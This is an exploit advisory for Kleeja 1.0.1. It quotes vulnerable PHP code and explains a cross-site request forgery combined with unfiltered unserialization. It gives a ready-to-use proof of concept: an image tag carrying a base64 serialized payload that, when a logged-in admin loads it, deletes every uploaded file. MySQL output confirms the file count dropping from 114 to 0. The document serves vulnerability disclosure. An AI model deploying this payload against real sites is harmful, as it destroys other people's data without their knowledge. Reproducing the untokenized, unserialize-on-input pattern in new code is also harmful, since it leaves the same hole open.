# Exploit Author: Qabandi ( @qab )
# Vendor Homepage: kleeja.com
# Software Link: kleeja.com/download
# Version: 1.0.1
----------------------------------------------------------------------------
Some actions are not tokenized which leaves the script vulnerable to CSRF attacks
----------------------------------------------------------------------------
in C:\AppServ\www\kleeja\includes\adm\c_files.php:-

ln:138| if(isset($_GET[&#039;deletefiles&#039;])){ <-- {{No Tokenization}}
...
...
ln:145|	$search	= kleeja_base64_decode($_GET[&#039;deletefiles&#039;]);
ln:146|	$search	= unserialize($search); <-- {{unfiltered unserializing, which means user can play with variable}}
...
...
ln:167|	$ipp			= $search[&#039;user_ip&#039;] != &#039;&#039; ? &#039;AND f.user_ip LIKE \&#039;%&#039; . $SQL->escape($search[&#039;user_ip&#039;]) . &#039;%\&#039; &#039; : &#039;&#039;;
ln:168|	//add the generated search sentence to the query
ln:169|	$query[&#039;WHERE&#039;] = "$size_than $file_namee $ups_than $exte $rep_than $usernamee $lstd_than $exte $ipp";<-- query is built according to unserialized _GET[deletefiles] var
ln:170|
ln:171|	$result = $SQL->build($query);
...
...
ln:174|	while($row=$SQL->fetch_array($result))
ln:175|	{
ln:176|			//delete from folder ..
ln:177|			@kleeja_unlink (PATH . $row[&#039;folder&#039;] . "/" . $row[&#039;name&#039;]);  <-- delete all files from query

------------------------------------------------
With a specifically crafted serialized variable we can trick the scrip into deleting all files by forcing the query to result in all files.

lets first look at a serialized variable for file searching according to IP (note: I base64 decoded it):
    deletefiles=a:1:{s:7:"user_ip";s:9:"127.0.0.1";}
    query will look something like this for example ( select filesToDelete from files where ip like &#039;%127.0.0.1%&#039; )
    
this is what is sent to the server when deleting, usually this would result in only the given ip&#039;s uploaded files being deleted.
but what if we send the following instead?:
    deletefiles=a:1:{s:7:"user_ip";s:1:".";}
    query will be ( select filesToDelete from files where ip like &#039;%.%&#039; )
    and since all ip&#039;s contain a dot &#039;.&#039; , all files will be deleted.
---------------------------------------------------
    PoC
<img src="http://localhost/kleeja/admin/index.php?cp=c_files&deletefiles=YToxOntzOjc6InVzZXJfaXAiO3M6MToiLiI7fQ==&_ajax_=1&_=Qabandi"/>
Admin must visit the link and it will execute and all files will be deleted.
---------------------------------------------------
mysql> select count(*) from klj_files;
+----------+
| count(*) |
+----------+
|      114 |
+----------+
1 row in set (0.00 sec)
##
visit link as admin:-
{"code":"1", "content":"\n\n
..
..
..
File 114 successfully deleted\n...
##
mysql> select count(*) from klj_files;
+----------+
| count(*) |
+----------+
|        0 |
+----------+
1 row in set (0.00 sec)

#salam



